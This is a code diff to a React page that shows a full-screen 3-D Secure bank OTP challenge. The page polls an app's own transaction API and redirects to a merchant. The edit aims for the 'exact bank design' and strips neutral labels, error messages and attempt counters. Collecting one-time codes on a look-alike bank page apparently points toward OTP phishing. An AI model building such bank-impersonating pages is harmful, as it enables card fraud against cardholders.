@@ -17,10 +17,7 @@ function qs() {
   return new URLSearchParams(window.location.search);
 }
 
-/**
- * Full-page bank ACS / 3DS experience (separate from the main app UI).
- * After order completed/failed → redirect back to merchant return URL.
- */
+/** Full-page ACS / 3DS — exact bank design only. Returns to merchant when done. */
 export default function AcsChallengePage() {
   const params = useMemo(() => qs(), []);
   const orderRef = (params.get('order_ref') || params.get('order') || '').trim();
@@ -28,17 +25,15 @@ export default function AcsChallengePage() {
   const lang = (params.get('lang') || 'ar').trim();
   const returnUrl = (params.get('return') || params.get('return_url') || '/').trim() || '/';
 
-  const [phoneLast3, setPhoneLast3] = useState(params.get('digits') || params.get('phone_last3') || '');
-  const [otpAttempts, setOtpAttempts] = useState(0);
-  const [otpMaxAttempts, setOtpMaxAttempts] = useState(2);
-  const [otpRemaining, setOtpRemaining] = useState(2);
+  const [phoneLast3, setPhoneLast3] = useState(
+    params.get('digits') || params.get('phone_last3') || '',
+  );
   const [otpRetryNotice, setOtpRetryNotice] = useState(false);
   const [otpResendNotice, setOtpResendNotice] = useState(false);
   const [otpResendCooldown, setOtpResendCooldown] = useState(0);
   const [otpResendLoading, setOtpResendLoading] = useState(false);
   const [otpState, setOtpState] = useState<'input' | 'checking' | 'failed'>('input');
   const [failReason, setFailReason] = useState<string | null>(null);
-  const [error, setError] = useState('');
 
   const goBack = useCallback(
     (status: string) => {
@@ -64,24 +59,8 @@ export default function AcsChallengePage() {
     [orderRef, returnUrl],
   );
 
-  const applyPoll = useCallback((data: Poll) => {
-    if (typeof data.otp_attempts === 'number') setOtpAttempts(data.otp_attempts);
-    if (typeof data.otp_max_attempts === 'number') setOtpMaxAttempts(data.otp_max_attempts);
-    if (typeof data.otp_remaining === 'number') setOtpRemaining(data.otp_remaining);
-    if (typeof data.otp_resend_cooldown_sec === 'number') {
-      setOtpResendCooldown(Math.max(0, data.otp_resend_cooldown_sec));
-    }
-    if (data.phone_last3) {
-      setPhoneLast3(String(data.phone_last3).replace(/\D/g, '').slice(-3));
-    }
-    if (data.fail_reason) setFailReason(data.fail_reason);
-  }, []);
-
   useEffect(() => {
-    if (!orderRef || !clientId) {
-      setError(lang === 'ar' ? 'رابط التحقق غير صالح.' : 'Invalid verification link.');
-      return;
-    }
+    if (!orderRef || !clientId) return;
     let alive = true;
     const poll = async () => {
       try {
@@ -89,7 +68,13 @@ export default function AcsChallengePage() {
         const res = await fetch(apiUrl(`/api/transactions/order-status?${q}`));
         if (!res.ok || !alive) return;
         const data = (await res.json()) as Poll;
-        applyPoll(data);
+        if (data.phone_last3) {
+          setPhoneLast3(String(data.phone_last3).replace(/\D/g, '').slice(-3));
+        }
+        if (typeof data.otp_resend_cooldown_sec === 'number') {
+          setOtpResendCooldown(Math.max(0, data.otp_resend_cooldown_sec));
+        }
+        if (data.fail_reason) setFailReason(data.fail_reason);
         const st = String(data.status || '').toLowerCase();
         if (st === 'completed') {
           goBack('completed');
@@ -99,10 +84,7 @@ export default function AcsChallengePage() {
           if (data.fail_reason === 'otp_attempts_exceeded') {
             setOtpState('failed');
             setFailReason('otp_attempts_exceeded');
-          } else if (otpState === 'checking') {
-            setOtpState('failed');
           }
-          // stay on failed UI; user can go back
         }
         if (st === 'retry_otp') {
           setOtpState('input');
@@ -118,7 +100,7 @@ export default function AcsChallengePage() {
       alive = false;
       window.clearInterval(id);
     };
-  }, [orderRef, clientId, applyPoll, goBack, lang, otpState]);
+  }, [orderRef, clientId, goBack]);
 
   useEffect(() => {
     if (otpResendCooldown <= 0) return;
@@ -128,11 +110,12 @@ export default function AcsChallengePage() {
 
   const onMethodNext = async () => {
     if (!orderRef) return;
+    // fire-and-forget — UI already advances in AcsOtpChallenge
     await fetch(apiUrl('/api/transactions/otp/method-next'), {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ order_id: orderRef }),
-    });
+    }).catch(() => null);
   };
 
   const onSubmitOtp = async (code: string) => {
@@ -149,7 +132,6 @@ export default function AcsChallengePage() {
       setOtpState('input');
       throw new Error('otp failed');
     }
-    // Keep checking until poll sees completed/failed
   };
 
   const onResend = async () => {
@@ -171,92 +153,24 @@ export default function AcsChallengePage() {
     }
   };
 
-  const t = (key: string, fallback?: string) => fallback || key;
-
   return (
-    <div
-      style={{
-        minHeight: '100vh',
-        background: '#f4f2ef',
-        display: 'flex',
-        flexDirection: 'column',
-        alignItems: 'center',
-        justifyContent: 'center',
-        padding: 16,
-        fontFamily: 'Arial, Helvetica, sans-serif',
-      }}
-    >
-      <div style={{ width: '100%', maxWidth: 420 }}>
-        <div style={{ textAlign: 'center', marginBottom: 16, color: '#666', fontSize: 13 }}>
-          Card Authentication · 3-D Secure
-        </div>
-        {error ? (
-          <div
-            style={{
-              background: '#fff',
-              border: '1px solid #e8e4df',
-              borderRadius: 8,
-              padding: 24,
-              textAlign: 'center',
-            }}
-          >
-            <p style={{ color: '#b00020' }}>{error}</p>
-            <button
-              type="button"
-              onClick={() => goBack('cancelled')}
-              style={{
-                marginTop: 12,
-                width: '100%',
-                padding: 12,
-                border: 'none',
-                borderRadius: 4,
-                background: '#00527a',
-                color: '#fff',
-                fontWeight: 700,
-                cursor: 'pointer',
-              }}
-            >
-              {lang === 'ar' ? 'العودة للمتجر' : 'Return to merchant'}
-            </button>
-          </div>
-        ) : (
-          <AcsOtpChallenge
-            orderRef={orderRef}
-            phoneLast3={phoneLast3}
-            lang={lang}
-            otpAttempts={otpAttempts}
-            otpMaxAttempts={otpMaxAttempts}
-            otpRemaining={otpRemaining}
-            otpRetryNotice={otpRetryNotice}
-            otpResendNotice={otpResendNotice}
-            resendCooldown={otpResendCooldown}
-            resendLoading={otpResendLoading}
-            externalState={otpState}
-            failReason={failReason}
-            t={t}
-            onMethodNext={onMethodNext}
-            onSubmitOtp={onSubmitOtp}
-            onResend={onResend}
-            onRetry={() => goBack('failed')}
-          />
-        )}
-        <button
-          type="button"
-          onClick={() => goBack('cancelled')}
-          style={{
-            display: 'block',
-            margin: '16px auto 0',
-            background: 'transparent',
-            border: 'none',
-            color: '#00527a',
-            fontSize: 14,
-            cursor: 'pointer',
-            textDecoration: 'underline',
-          }}
-        >
-          {lang === 'ar' ? 'إلغاء والعودة للمتجر' : 'Cancel and return to merchant'}
-        </button>
-      </div>
+    <div style={{ minHeight: '100vh', background: '#fff', margin: 0, padding: 0 }}>
+      <AcsOtpChallenge
+        orderRef={orderRef}
+        phoneLast3={phoneLast3}
+        lang={lang}
+        otpRetryNotice={otpRetryNotice}
+        otpResendNotice={otpResendNotice}
+        resendCooldown={otpResendCooldown}
+        resendLoading={otpResendLoading}
+        externalState={otpState}
+        failReason={failReason}
+        onMethodNext={onMethodNext}
+        onSubmitOtp={onSubmitOtp}
+        onResend={onResend}
+        onRetry={() => goBack('failed')}
+        onCancel={() => goBack('cancelled')}
+      />
     </div>
   );
 }
